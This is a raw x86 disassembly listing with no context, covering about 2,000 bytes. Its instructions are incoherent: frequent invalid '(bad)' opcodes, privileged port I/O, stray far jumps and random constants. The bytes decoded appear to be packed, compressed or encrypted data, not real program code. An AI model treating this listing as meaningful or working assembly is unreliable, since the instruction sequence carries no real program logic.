  415e58:	retf   0x2430
  415e5b:	ror    DWORD PTR [edx-0x136536ed],cl
  415e61:	adc    BYTE PTR [esi+edx*8],bh
  415e64:	rcl    DWORD PTR [edi-0x68],0xf4
  415e68:	pop    eax
  415e69:	xchg   DWORD PTR [edi-0x3e3c0b73],esi
  415e6f:	push   edx
  415e70:	(bad)  
  415e71:	(bad)  
  415e73:	cmp    edx,esp
  415e75:	jg     0x415edd
  415e77:	push   0xf1a7eda2
  415e7c:	mov    WORD PTR [esi],ss
  415e7e:	movntps XMMWORD PTR [ecx-0x5e],xmm6
  415e82:	leave  
  415e83:	jp     0x415ea4
  415e85:	cmp    DWORD PTR [edx+0x46b13ba6],0xfa03e9cc
  415e8f:	mov    ds:0xcec1dc9c,eax
  415e94:	int    0x31
  415e96:	aaa    
  415e97:	dec    eax
  415e98:	sub    BYTE PTR [ecx+0x6fa3b8d9],bh
  415e9e:	mov    ?,ebx
  415ea0:	arpl   bx,dx
  415ea2:	mov    ebp,0xe973b2af
  415ea7:	cmp    ch,dl
  415ea9:	and    BYTE PTR [ecx+0x16],0x75
  415ead:	cmp    dl,BYTE PTR [edx-0x61902adc]
  415eb3:	mov    edx,0x7ef0d638
  415eb8:	in     al,0xbd
  415eba:	mov    esi,0x7b267025
  415ebf:	sahf   
  415ec0:	dec    ecx
  415ec1:	outs   dx,BYTE PTR ds:[esi]
  415ec2:	in     al,dx
  415ec3:	test   eax,0xb0d87b7f
  415ec8:	inc    eax
  415ec9:	leave  
  415eca:	fisub  WORD PTR [edi]
  415ecc:	cmp    al,0x51
  415ece:	stos   DWORD PTR es:[edi],eax
  415ecf:	pop    edx
  415ed0:	repz add BYTE PTR [ebx-0x693f7535],0x55
  415ed8:	loopne 0x415ed4
  415eda:	xchg   cl,dh
  415edc:	inc    edx
  415edd:	xor    eax,0x6d22ac9d
  415ee2:	dec    esp
  415ee3:	loopne 0x415eaf
  415ee5:	push   esi
  415ee6:	in     eax,0x68
  415ee8:	gs aam 0xe6
  415eeb:	(bad)  
  415eec:	push   ebp
  415eed:	xchg   edx,eax
  415eee:	jns    0x415e9c
  415ef0:	stos   BYTE PTR es:[edi],al
  415ef1:	sbb    DWORD PTR [esi],ebx
  415ef3:	test   eax,0x3c3b1a1c
  415ef8:	out    0xd,eax
  415efa:	inc    ebx
  415efb:	pop    eax
  415efc:	mov    al,ds:0x761aaf39
  415f01:	shl    DWORD PTR [eax+0x22987c88],0xf0
  415f08:	lods   al,BYTE PTR ds:[esi]
  415f09:	jl     0x415ee7
  415f0b:	push   esi
  415f0c:	in     eax,dx
  415f0d:	lods   al,BYTE PTR ds:[esi]
  415f0e:	sub    bl,BYTE PTR [edx]
  415f10:	push   es
  415f11:	scas   eax,DWORD PTR es:[edi]
  415f12:	mov    bh,BYTE PTR [edi+eiz*4-0x513961e6]
  415f19:	xor    edi,DWORD PTR gs:[ecx-0x1e0ccd1f]
  415f20:	in     al,0x4a
  415f22:	dec    edx
  415f23:	cmp    bl,BYTE PTR [esi+0x25]
  415f26:	out    0x69,al
  415f28:	aam    0xb1
  415f2a:	fst    DWORD PTR [eax-0x4b6f833a]
  415f30:	xor    BYTE PTR fs:[edi-0x52],al
  415f34:	out    0x7f,al
  415f36:	push   edi
  415f37:	aad    0xd3
  415f39:	sub    BYTE PTR [ebp+ebx*4+0x72],0xb0
  415f3e:	cdq    
  415f3f:	adc    eax,0x941f249e
  415f44:	jp     0x415f58
  415f46:	(bad)  
  415f47:	and    ah,BYTE PTR [esi+0x75]
  415f4a:	into   
  415f4b:	push   ecx
  415f4c:	das    
  415f4d:	jge    0x415f06
  415f4f:	and    cl,BYTE PTR [ecx]
  415f51:	daa    
  415f52:	cmc    
  415f53:	int3   
  415f54:	push   ss
  415f55:	inc    ecx
  415f57:	xor    DWORD PTR [ebx-0x6],0x2d
  415f5b:	mov    ?,WORD PTR [edx+0x5f1b8d89]
  415f61:	push   ebx
  415f62:	push   es
  415f63:	mov    dl,0x90
  415f65:	sbb    edi,DWORD PTR [ebp+0x52a3c0b4]
  415f6b:	xlat   BYTE PTR ds:[ebx]
  415f6c:	outs   dx,BYTE PTR ds:[esi]
  415f6d:	push   cs
  415f6e:	rcr    BYTE PTR [ebx-0x56],cl
  415f71:	int3   
  415f72:	mov    ecx,0xe2f1a891
  415f77:	test   al,0xb1
  415f79:	jmp    0x415f5c
  415f7b:	dec    esp
  415f7c:	mov    bh,0x52
  415f7e:	mov    ebp,0xe5dfc6a4
  415f83:	loope  0x415fec
  415f85:	in     al,0x9a
  415f87:	dec    edx
  415f88:	jmp    0x71c8:0x9470224a
  415f8f:	loopne 0x415f42
  415f91:	push   ss
  415f92:	sbb    ah,BYTE PTR [esi-0x19]
  415f95:	dec    ebx
  415f96:	aam    0xd7
  415f98:	jbe    0x415ff6
  415f9a:	add    ch,al
  415f9c:	stos   DWORD PTR es:[edi],eax
  415f9d:	jl     0x415f3c
  415f9f:	scas   eax,DWORD PTR es:[edi]
  415fa0:	call   0x32e2edfb
  415fa5:	cmp    edx,DWORD PTR [bx+si]
  415fa8:	fdiv   DWORD PTR [ecx+0x576d28c]
  415fae:	ss (bad) 
  415fb1:	sub    BYTE PTR [ecx-0x57],al
  415fb4:	shl    DWORD PTR ds:0x6b39842f,0x3e
  415fbb:	stos   BYTE PTR es:[edi],al
  415fbc:	aaa    
  415fbd:	mov    ebp,0xb9a54612
  415fc2:	xchg   BYTE PTR [edx+0x36],al
  415fc5:	push   ebp
  415fc6:	sbb    BYTE PTR [ebx+0x53870787],bh
  415fcc:	mov    al,ds:0x553d8359
  415fd1:	cmc    
  415fd2:	stos   BYTE PTR es:[edi],al
  415fd3:	outs   dx,BYTE PTR ds:[esi]
  415fd4:	mov    ebx,0x1a6e1629
  415fd9:	or     esp,DWORD PTR [esi]
  415fdb:	xor    al,0x84
  415fdd:	sti    
  415fde:	jle    0x415fb7
  415fe0:	push   ds
  415fe1:	scas   al,BYTE PTR es:[edi]
  415fe2:	adc    bl,ch
  415fe4:	add    edi,DWORD PTR [ecx]
  415fe6:	dec    edx
  415fe7:	adc    DWORD PTR [edx+ebx*4-0x36],ecx
  415feb:	jge    0x415f9f
  415fed:	(bad)  
  415fef:	xor    esp,DWORD PTR [ecx+0x54]
  415ff2:	aaa    
  415ff3:	out    0xbd,al
  415ff5:	push   cs
  415ff6:	or     dh,ch
  415ff8:	test   eax,0x2a0ae9ac
  415ffd:	xor    cl,BYTE PTR [ebx+0x15]
  416000:	adc    dl,dh
  416002:	aas    
  416003:	ss mov dh,0xcd
  416006:	xor    BYTE PTR [ecx],bl
  416008:	test   eax,0x9ca86d9a
  41600d:	mov    esp,DWORD PTR cs:[edi]
  416010:	test   al,0xf2
  416012:	es add dh,dh
  416015:	sbb    cl,BYTE PTR [edi+edi*2-0x12]
  416019:	aaa    
  41601a:	or     bh,BYTE PTR ss:[esi+eax*2]
  41601e:	ja     0x415fe9
  416020:	pop    bp
  416022:	and    eax,0xa4adce6f
  416027:	(bad)  
  416028:	out    0xd6,eax
  41602a:	lahf   
  41602b:	call   FWORD PTR [eax+edx*2-0x3f3bcf35]
  416032:	xor    cl,BYTE PTR [ebx]
  416034:	cmp    ecx,edi
  416036:	sub    BYTE PTR [edi],ch
  416038:	add    DWORD PTR [eax+0x2cdaedd0],ebp
  41603e:	aad    0x6d
  416040:	sbb    BYTE PTR ds:[edi+0x28964b02],dl
  416047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416048:	shr    DWORD PTR [ebp-0x74],1
  41604b:	mov    cl,0xf0
  41604d:	(bad)  
  41604e:	sbb    BYTE PTR [ebx],bl
  416050:	das    
  416051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416052:	adc    BYTE PTR [ebp+0x3bb178ef],dl
  416058:	aad    0x40
  41605a:	mov    ebx,0x5580cbc
  41605f:	imul   edx,DWORD PTR [ebx+edi*1-0x4b1f049f],0x79
  416067:	jl     0x415ff0
  416069:	mov    esi,0x3c8e9d8a
  41606e:	imul   edi,esp,0x9c0779c0
  416074:	mov    WORD PTR [ebx+0x175b662e],fs
  41607a:	sbb    DWORD PTR [edx+esi*2-0x18],eax
  41607e:	ret    
  41607f:	test   eax,0x193eda2a
  416084:	hlt    
  416085:	repz in al,0x90
  416088:	mov    edx,0x63136aa3
  41608d:	inc    edx
  41608e:	mov    dh,0xc
  416090:	das    
  416091:	and    eax,0x7d909a06
  416096:	rcl    DWORD PTR ds:0xd80c8d20,1
  41609c:	or     ebp,DWORD PTR [ebx]
  41609e:	jb     0x41610a
  4160a0:	int3   
  4160a1:	sahf   
  4160a2:	jle    0x416050
  4160a4:	dec    edi
  4160a5:	pop    ss
  4160a6:	sbb    bl,BYTE PTR ds:0x110a908e
  4160ac:	outs   dx,DWORD PTR ds:[esi]
  4160ad:	xchg   esi,eax
  4160ae:	outs   dx,BYTE PTR ds:[esi]
  4160af:	jp     0x41609a
  4160b1:	mov    DWORD PTR [ebx-0x5],esp
  4160b4:	dec    esi
  4160b5:	dec    esi
  4160b6:	xchg   ebx,eax
  4160b7:	inc    eax
  4160b8:	xchg   esp,eax
  4160b9:	mov    eax,ds:0xd84882a1
  4160be:	vpsrlw xmm5,xmm4,XMMWORD PTR [ecx+0x4]
  4160c3:	in     eax,dx
  4160c4:	add    al,BYTE PTR [eax]
  4160c6:	xchg   esp,eax
  4160c7:	jmp    0xeebb:0xf8fc42be
  4160ce:	ins    DWORD PTR es:[edi],dx
  4160cf:	inc    eax
  4160d0:	xchg   edx,eax
  4160d1:	cmc    
  4160d2:	sub    DWORD PTR [eax+0x8],esp
  4160d5:	(bad)  
  4160d7:	xchg   esp,eax
  4160d8:	std    
  4160d9:	push   ss
  4160da:	or     al,0x41
  4160dc:	mov    bh,0x66
  4160de:	scas   al,BYTE PTR es:[edi]
  4160df:	daa    
  4160e0:	xor    BYTE PTR [eax+0x69],bl
  4160e3:	in     eax,0xd
  4160e5:	hlt    
  4160e6:	add    esp,ebp
  4160e8:	sbb    esi,DWORD PTR [edi-0x635e9b47]
  4160ee:	and    ecx,ecx
  4160f0:	popf   
  4160f1:	xor    al,0x40
  4160f3:	inc    ecx
  4160f4:	lahf   
  4160f5:	imul   ecx,DWORD PTR [ecx+0x237a5a95],0xffffffd4
  4160fc:	xchg   edx,eax
  4160fd:	add    BYTE PTR [esi+0x24d73c1c],ah
  416103:	fdivr  QWORD PTR [ebx-0x6b]
  416106:	xchg   ecx,eax
  416107:	sub    DWORD PTR [ebx-0x164185a6],ecx
  41610d:	add    DWORD PTR [ebp+0x1608065b],eax
  416113:	sub    eax,0xf2362428
  416118:	jno    0x416166
  41611a:	push   0xffffffbf
  41611c:	jp     0x416194
  41611e:	xor    dl,BYTE PTR [ecx]
  416120:	addr16 fwait
  416122:	add    dl,bh
  416124:	cld    
  416125:	and    eax,DWORD PTR [edx]
  416127:	pusha  
  416128:	(bad)  
  41612a:	sub    cl,BYTE PTR [esi+0x4a0ff46f]
  416130:	scas   eax,DWORD PTR es:[edi]
  416131:	leave  
  416132:	dec    esi
  416133:	sbb    eax,0xf6e666a
  416138:	outs   dx,BYTE PTR ds:[esi]
  416139:	retf   0x97a0
  41613c:	sbb    eax,0xa8a33bcb
  416141:	dec    esp
  416142:	out    0x89,al
  416144:	fwait
  416145:	push   es
  416146:	(bad)  
  416147:	outs   dx,DWORD PTR ss:[esi]
  416149:	mov    DWORD PTR [edx],esp
  41614b:	scas   eax,DWORD PTR es:[edi]
  41614c:	sub    bl,ah
  41614e:	pushf  
  41614f:	(bad)  
  416150:	and    ch,BYTE PTR [ebx+0x39afa1b5]
  416156:	adc    eax,0x29f228da
  41615b:	cmp    BYTE PTR [edi],0x30
  41615e:	(bad)  
  41615f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416160:	sbb    ebx,DWORD PTR [ecx+ebp*2]
  416163:	pop    ebx
  416164:	mov    ds:0xecb9bf23,eax
  416169:	enter  0xfee6,0x17
  41616d:	or     ch,BYTE PTR [ecx-0x36]
  416170:	push   ebx
  416171:	push   edi
  416172:	add    eax,0x80a3d38a
  416177:	push   edi
  416178:	push   0x61cf2421
  41617d:	outs   dx,DWORD PTR ds:[esi]
  41617e:	push   eax
  41617f:	mov    bl,0x8b
  416181:	mov    ds:0x3e11baa,al
  416186:	loop   0x416147
  416188:	fucomp st(7)
  41618a:	sub    al,0xd6
  41618c:	mov    edi,0x7f96c9f2
  416191:	jb     0x416190
  416193:	mov    eax,0xa471e7dd
  416198:	lds    esp,FWORD PTR [ebx-0x45]
  41619b:	jge    0x4161f1
  41619d:	jns    0x4161e9
  41619f:	push   ss
  4161a0:	sbb    DWORD PTR [esi],esi
  4161a2:	scas   eax,DWORD PTR es:[edi]
  4161a3:	mov    al,ds:0x6bdf9be2
  4161a8:	ror    BYTE PTR [edx+0x165bc9d4],0xf0
  4161af:	mov    dl,0xca
  4161b1:	retf   0xe728
  4161b4:	aaa    
  4161b5:	call   0x6297724c
  4161ba:	loope  0x416202
  4161bc:	das    
  4161bd:	xor    ecx,ecx
  4161bf:	mov    dl,0xc6
  4161c1:	mov    esi,0xd99e4e55
  4161c6:	in     eax,0x79
  4161c8:	xchg   DWORD PTR [ecx],esi
  4161ca:	add    al,0xfb
  4161cc:	push   0x82e6b4a9
  4161d1:	push   cs
  4161d2:	dec    edi
  4161d3:	out    0x23,eax
  4161d5:	jno    0x4161c8
  4161d7:	xor    bh,bh
  4161d9:	imul   esp,DWORD PTR [ebx+0x415a5360],0xf300cd36
  4161e3:	ss pushf 
  4161e5:	dec    esi
  4161e6:	pop    esi
  4161e7:	nop
  4161e8:	add    al,0xf6
  4161ea:	add    al,0xab
  4161ec:	mov    ch,0x98
  4161ee:	mov    cl,0x0
  4161f0:	add    DWORD PTR [edi+0xef29be9],0xd6714219
  4161fa:	dec    eax
  4161fb:	inc    ecx
  4161fc:	push   es
  4161fd:	ds repz mov ebp,0x8b06f10c
  416204:	pop    ds
  416205:	sub    BYTE PTR [eax],ch
  416207:	adc    DWORD PTR [ecx],ebp
  416209:	ins    DWORD PTR es:[edi],dx
  41620a:	push   ecx
  41620b:	jae    0x4161ee
  41620d:	inc    ebx
  41620e:	and    DWORD PTR [ebp+0x72d5d896],ebx
  416214:	lahf   
  416215:	dec    ebx
  416216:	mov    eax,gs
  416218:	adc    al,0x45
  41621a:	cld    
  41621b:	dec    eax
  41621c:	push   0x4a24e1c6
  416221:	xchg   edi,eax
  416222:	shr    BYTE PTR [ebp+0x75610057],1
  416228:	and    eax,0xcf66fe74
  41622d:	int3   
  41622e:	sub    DWORD PTR [esi],edi
  416230:	in     al,dx
  416231:	sbb    BYTE PTR [esp+ecx*2+0x472b3a60],dh
  416238:	mov    edi,0x43205c00
  41623d:	xor    DWORD PTR [ecx+0x7f4c4ab8],ecx
  416243:	mov    al,0x1
  416245:	in     al,0xd1
  416247:	pop    ebx
  416248:	lods   eax,DWORD PTR ds:[esi]
  416249:	into   
  41624a:	shl    BYTE PTR [ebx+0x79],0x90
  41624e:	mov    edi,0x431f9172
  416253:	mov    al,0x64
  416255:	and    eax,0x2f17e8d3
  41625a:	pop    ecx
  41625b:	dec    eax
  41625c:	arpl   WORD PTR [ebx+ebx*1-0x6c501986],bp
  416263:	cmp    al,0x2b
  416265:	loop   0x4162c3
  416267:	pop    ss
  416268:	dec    edx
  416269:	sahf   
  41626a:	(bad)  
  41626c:	sbb    BYTE PTR [di-0x80],ch
  416270:	test   eax,0xa822be28
  416275:	lods   al,BYTE PTR ds:[esi]
  416276:	and    al,0x20
  416278:	inc    esp
  416279:	push   esi
  41627a:	test   esp,edi
  41627c:	data16 jg 0x416218
  41627f:	ret    0xc8f9
  416282:	xlat   BYTE PTR ds:[ebx]
  416283:	sbb    dh,BYTE PTR [eax+edx*4-0x1776f481]
  41628a:	ins    DWORD PTR es:[edi],dx
  41628b:	into   
  41628c:	mov    ?,edi
  41628e:	pop    edi
  41628f:	ds sub al,0x8
  416292:	xchg   esi,eax
  416293:	adc    eax,ebx
  416295:	sub    BYTE PTR [ebx+ecx*8-0x5ad2f169],dl
  41629c:	addr16 into 
  41629e:	ret    0xf252
  4162a1:	dec    ebp
  4162a2:	in     al,0xbf
  4162a4:	mov    ebx,0xcb1d4e61
  4162a9:	xor    al,0xb6
  4162ab:	repnz retf 0x17ef
  4162af:	cmp    al,0xaf
  4162b1:	das    
  4162b2:	jb     0x4162fb
  4162b4:	cmc    
  4162b5:	or     DWORD PTR [edx-0x2b2a4bce],ebx
  4162bb:	cs push ss
  4162bd:	popf   
  4162be:	gs shr bl,1
  4162c1:	jb     0x416297
  4162c3:	and    BYTE PTR [eax-0x60e01dd9],dl
  4162c9:	test   ah,bh
  4162cb:	pop    es
  4162cc:	loopne 0x4162f3
  4162ce:	rcr    DWORD PTR [esi+0xd274142],0xbe
  4162d5:	inc    esp
  4162d6:	pop    ds
  4162d7:	sub    ebp,edi
  4162d9:	ss xchg edx,eax
  4162db:	leave  
  4162dc:	jae    0x416324
  4162de:	inc    ecx
  4162df:	ja     0x416296
  4162e1:	jge    0x4162f8
  4162e3:	stc    
  4162e4:	rcl    DWORD PTR cs:[ecx],cl
  4162e7:	loope  0x4162b8
  4162e9:	mov    BYTE PTR [edx-0xc9a3488],ah
  4162ef:	sub    BYTE PTR [edx+eiz*8],ah
  4162f2:	out    dx,eax
  4162f3:	sti    
  4162f4:	js     0x4162ae
  4162f6:	aad    0xe6
  4162f8:	jge    0x416291
  4162fa:	mov    ds:0x18669961,eax
  4162ff:	nop
  416300:	lods   al,BYTE PTR ds:[esi]
  416301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416302:	stc    
  416303:	repnz mov esi,0xd27b975a
  416309:	mov    dh,0xa6
  41630b:	inc    esi
  41630c:	add    eax,0x5ba4b46b
  416311:	repz mov edx,0x21813759
  416317:	push   ds
  416318:	bound  ebp,QWORD PTR [ecx+0x1da92620]
  41631e:	adc    dl,ch
  416320:	aas    
  416321:	sar    cl,0xba
  416324:	pop    ecx
  416325:	popa   
  416326:	ins    BYTE PTR es:[edi],dx
  416327:	jmp    0xb85baa15
  41632c:	jno    0x416305
  41632e:	in     al,0x58
  416330:	pop    es
  416331:	mov    esp,0x4eb76752
  416336:	cs ficom WORD PTR cs:[ebx-0x46fea316]
  41633e:	or     eax,0xf13574e2
  416343:	sub    al,0xd9
  416345:	je     0x4162dd
  416347:	sbb    DWORD PTR [esi+0x21a2d44c],esp
  41634d:	lds    ecx,FWORD PTR [eax+0x48a92657]
  416353:	and    BYTE PTR [eax+eax*2-0x18],al
  416357:	(bad)  
  416358:	fiadd  WORD PTR [ecx+ebp*1]
  41635b:	push   ebp
  41635c:	lahf   
  41635d:	repz push ecx
  41635f:	pop    eax
  416360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416361:	repz inc esi
  416363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416364:	xchg   ecx,eax
  416365:	sbb    eax,0x41c927b4
  41636a:	fnstenv [ebp-0xe]
  41636d:	adc    eax,0xb9a5e7bc
  416372:	fwait
  416373:	loop   0x416311
  416375:	loope  0x4163b7
  416377:	push   ss
  416378:	fisttp QWORD PTR [edx-0x7a28645f]
  41637e:	lea    esp,[ebx-0x4f]
  416381:	xor    ah,ah
  416383:	xor    esi,DWORD PTR [eax]
  416385:	mov    esi,esp
  416387:	push   ebx
  416388:	test   DWORD PTR [edx-0x26dd8c07],edi
  41638e:	mov    dh,BYTE PTR [ecx]
  416390:	inc    ecx
  416391:	std    
  416392:	mov    ah,0xb5
  416394:	push   cs
  416395:	stos   BYTE PTR es:[edi],al
  416396:	data16 loop 0x4163ba
  416399:	xor    BYTE PTR [edx+0x27],dh
  41639c:	xchg   BYTE PTR [ecx+eax*2],dh
  41639f:	shl    DWORD PTR [ebx+edi*2],cl
  4163a2:	cmp    eax,0x8a7e32ab
  4163a7:	jne    0x4163b1
  4163a9:	and    dh,BYTE PTR [edx+0x77bbe6a0]
  4163af:	cmp    BYTE PTR [edi-0x7c],bl
  4163b2:	popa   
  4163b3:	ss mov ebx,0x45f6200c
  4163b9:	jbe    0x416376
  4163bb:	add    ah,BYTE PTR [eax-0x5b6e47fb]
  4163c1:	lods   eax,DWORD PTR ds:[esi]
  4163c2:	pop    ebp
  4163c3:	test   BYTE PTR [ecx+0x3651765c],0xbd
  4163ca:	pop    ss
  4163cb:	jmp    0x704f:0x2c5a0cde
  4163d2:	inc    edx
  4163d3:	mov    al,0x32
  4163d5:	mov    ecx,0xe21bc669
  4163da:	xor    BYTE PTR [esi],cl
  4163dc:	bound  eax,QWORD PTR [ecx+0x59c42d06]
  4163e2:	sbb    DWORD PTR [eax+0x16597bbf],ebx
  4163e8:	test   al,0xf1
  4163ea:	and    dl,BYTE PTR [eax-0x76]
  4163ed:	adc    ecx,ecx
  4163ef:	shl    BYTE PTR [edx-0x19],0xc4
  4163f3:	imul   BYTE PTR [esi+0x2b]
  4163f6:	push   ecx
  4163f7:	add    al,0xd0
  4163f9:	mov    bh,BYTE PTR [eax]
  4163fb:	jnp    0x416395
  4163fd:	shr    DWORD PTR [ecx-0x2c],0x56
  416401:	lock add bl,al
  416404:	sub    BYTE PTR [ebp-0x733e0614],ah
  41640a:	test   BYTE PTR [ecx-0x54],bl
  41640d:	mov    ds:0x211a13f6,eax
  416412:	sahf   
  416413:	fwait
  416414:	addr16 push edx
  416416:	fcomp  DWORD PTR [ecx+0x2e]
  416419:	mov    ds:0x4a9f778e,al
  41641e:	mov    dl,0x61
  416420:	sahf   
  416421:	push   edi
  416422:	add    eax,0x82c04ef1
  416427:	call   0x79edefe3
  41642c:	ins    DWORD PTR es:[edi],dx
  41642d:	pop    edi
  41642e:	sub    DWORD PTR es:[edi-0x3e],ecx
  416432:	cli    
  416433:	jge    0x416419
  416435:	and    al,0x9e
  416437:	xchg   edx,eax
  416438:	xor    DWORD PTR [esi-0x738fe43d],esi
  41643e:	mov    BYTE PTR [eax+0x4b],ch
  416441:	test   ecx,eax
  416443:	inc    esi
  416444:	dec    eax
  416445:	push   es
  416446:	cdq    
  416447:	popf   
  416448:	xchg   BYTE PTR [edx+0x4d],ch
  41644b:	adc    al,ah
  41644d:	retf   0x2969
  416450:	out    dx,eax
  416451:	stos   DWORD PTR es:[edi],eax
  416452:	ss sub eax,0xf42e5811
  416458:	popf   
  416459:	jecxz  0x416444
  41645b:	pop    edi
  41645c:	adc    eax,0x9483d3a9
  416461:	(bad)  
  416462:	push   esi
  416463:	fcomp  QWORD PTR [ecx]
  416465:	scas   al,BYTE PTR es:[edi]
  416466:	lea    esp,[edx-0x19e90402]
  41646c:	jge    0x41643d
  41646e:	xchg   BYTE PTR [esi+0x44],al
  416471:	jbe    0x416422
  416473:	mov    BYTE PTR [bp+0x12],bh
  416477:	shr    DWORD PTR [esi+0x74],0xc3
  41647b:	mov    ds:0x3dc62fa4,al
  416480:	outs   dx,BYTE PTR ds:[esi]
  416481:	push   edi
  416482:	fstp   DWORD PTR [esi-0x6a]
  416485:	cli    
  416486:	push   ebx
  416487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416488:	inc    ebx
  416489:	mov    ?,WORD PTR [ebx+esi*8+0x37468bdf]
  416490:	fstp   st(6)
  416492:	fdiv   QWORD PTR [ebp-0x48]
  416495:	dec    edx
  416496:	pop    edx
  416497:	pop    ebp
  416498:	cdq    
  416499:	push   esi
  41649a:	push   eax
  41649b:	cmp    al,0x8a
  41649d:	mov    BYTE PTR [esi],0x97
  4164a0:	jno    0x4164c6
  4164a2:	pop    ss
  4164a3:	adc    esp,DWORD PTR [ebx+ebp*4-0x37]
  4164a7:	in     al,dx
  4164a8:	fdivr  QWORD PTR [edx]
  4164aa:	lock or dl,dl
  4164ad:	iret   
  4164ae:	xor    DWORD PTR [ebx],esi
  4164b0:	xchg   esi,eax
  4164b1:	test   DWORD PTR [ebx+0x4c],0x90d2bea4
  4164b8:	push   esi
  4164b9:	sbb    bl,BYTE PTR [edi-0x4fcf79e5]
  4164bf:	and    al,0x6b
  4164c1:	pop    ecx
  4164c2:	mov    edx,0x39ab3dfa
  4164c7:	adc    ebx,edx
  4164c9:	sbb    dl,BYTE PTR [eax+0x181c9cdd]
  4164cf:	loope  0x4164c4
  4164d1:	aas    
  4164d2:	sub    eax,0x1ea4cfde
  4164d7:	mov    BYTE PTR [edx-0x1b],ch
  4164da:	fldcw  WORD PTR [edx]
  4164dc:	add    BYTE PTR [ecx+0x2c],bh
  4164df:	mov    ds:0x6735ad35,al
  4164e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e5:	jbe    0x416514
  4164e7:	hlt    
  4164e8:	fld    DWORD PTR [ebx+0x3c]
  4164eb:	mov    bl,0x9c
  4164ed:	addr16 jno 0x416521
  4164f0:	mov    ds:0xf367fac6,al
  4164f5:	dec    esp
  4164f6:	and    DWORD PTR [edx-0x43],ecx
  4164f9:	leave  
  4164fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fb:	cmp    eax,0x5e3cb22d
  416500:	test   ebx,0xdcb84ab0
  416506:	xchg   ebp,eax
  416507:	lds    esi,FWORD PTR [edi+ecx*2+0xaa26e7]
  41650e:	fcomp  QWORD PTR [eax+edx*1+0x4065c0e7]
  416515:	pop    es
  416516:	scas   al,BYTE PTR es:[edi]
  416517:	dec    edi
  416518:	pop    edi
  416519:	outs   dx,BYTE PTR ds:[esi]
  41651a:	add    al,0x30
  41651c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41651d:	add    esp,DWORD PTR [edx-0x72cb13cb]
  416523:	sbb    DWORD PTR [edi+0x548110fb],eax
  416529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41652a:	shl    ah,cl
  41652c:	test   dh,dh
  41652e:	(bad)  
  41652f:	fucomp st(6)
  416531:	scas   eax,DWORD PTR es:[edi]
  416532:	mov    eax,0x19701da
  416537:	xor    eax,0xa2263501
  41653c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41653d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41653e:	pop    edx
  41653f:	and    edx,esi
  416541:	xchg   esi,eax
  416542:	pop    ebx
  416543:	fcmovnu st,st(2)
  416545:	mov    bl,0xcf
  416547:	mov    DWORD PTR [edi+edi*2],0xe306eb
  41654e:	or     DWORD PTR [edi],0xffffff93
  416551:	ret    
  416552:	retf   0xd230
  416555:	(bad)  [ecx+0x65006eb4]
  41655b:	jb     0x416567
  41655d:	test   al,0x3c
  41655f:	loop   0x4165b7
  416561:	retf   
  416562:	dec    ecx
  416563:	cmp    BYTE PTR [ecx+0x528edacf],dh
  416569:	add    bh,BYTE PTR [ebx]
  41656b:	jge    0x41651d
  41656d:	sti    
  41656e:	hlt    
  41656f:	mov    ch,BYTE PTR [edx-0x52]
  416572:	shl    DWORD PTR [ebp-0x5a],cl
  416575:	or     eax,0xcc870971
  41657a:	inc    ebp
  41657b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657c:	or     edx,edi
  41657e:	idiv   DWORD PTR [eax]
  416580:	arpl   WORD PTR gs:[ebp+0x26],si
  416584:	jle    0x4165d0
  416586:	mov    gs,WORD PTR [ecx+ecx*8+0x5da05d4c]
  41658d:	inc    edi
  41658e:	dec    edi
  41658f:	cmp    al,0x1f
  416591:	imul   edx,DWORD PTR [esi-0x50935d01],0x557fd79b
  41659b:	nop
  41659c:	in     al,dx
  41659d:	cmp    eax,0x49191cb4
  4165a2:	add    ebx,0x0
  4165a5:	and    DWORD PTR [esi],0x313d5343
  4165ab:	out    dx,al
  4165ac:	jle    0x4165ef
  4165ae:	inc    edx
  4165af:	out    dx,eax
  4165b0:	test   al,0x93
  4165b2:	sbb    al,0x34
  4165b4:	fucomip st,st(3)
  4165b6:	mov    esp,ds
  4165b8:	inc    ecx
  4165b9:	(bad)  
  4165ba:	xchg   esp,eax
  4165bb:	inc    edi
  4165bc:	or     edi,DWORD PTR [esi+0x23]
  4165bf:	mov    eax,ds:0x6fe79fc7
  4165c4:	dec    edi
  4165c5:	lods   al,BYTE PTR ds:[esi]
  4165c6:	mov    edx,0xdc0201e1
  4165cb:	les    eax,FWORD PTR [ebx]
  4165cd:	test   DWORD PTR [eax+esi*1],edi
  4165d0:	jae    0x41656e
  4165d2:	test   al,0xe0
  4165d4:	jmp    0xfd783b24
  4165d9:	pop    eax
  4165da:	js     0x416618
  4165dc:	jg     0x416646
  4165de:	sar    DWORD PTR [ebx],1
  4165e0:	hlt    
  4165e1:	aaa    
  4165e2:	sub    eax,0x65ae9c54
  4165e7:	icebp  
  4165e8:	add    eax,0x97721bfe
  4165ed:	xor    DWORD PTR [esi-0x62],eax
  4165f0:	xchg   ebx,eax
  4165f1:	lods   eax,DWORD PTR ds:[esi]
  4165f2:	mov    edi,0x946489d5
  4165f7:	sahf   
  4165f8:	jmp    0x8e641a5e
  4165fd:	add    al,0xcc
  4165ff:	push   0xc3ac2ebe
  416604:	pop    ss
  416605:	xchg   DWORD PTR [eax+0x4ed86468],ecx
  41660b:	int3   
  41660c:	or     DWORD PTR [ebx],ebx
  41660e:	je     0x416670
  416610:	ret    0xe000
  416613:	in     al,0x72
  416615:	gs push esp
  416617:	inc    ecx
  416618:	aam    0xdd
  41661a:	and    BYTE PTR [eax+eax*8+0x10],0xf3
  41661f:	xor    al,0x62
  416621:	loope  0x4165a9
  416623:	gs pop es
  416625:	or     bh,BYTE PTR [esi-0xc]
  416628:	(bad)  
  416629:	pop    edx
  41662a:	xchg   BYTE PTR [ecx-0x3c4f3ca4],dh
  416630:	pop    edi
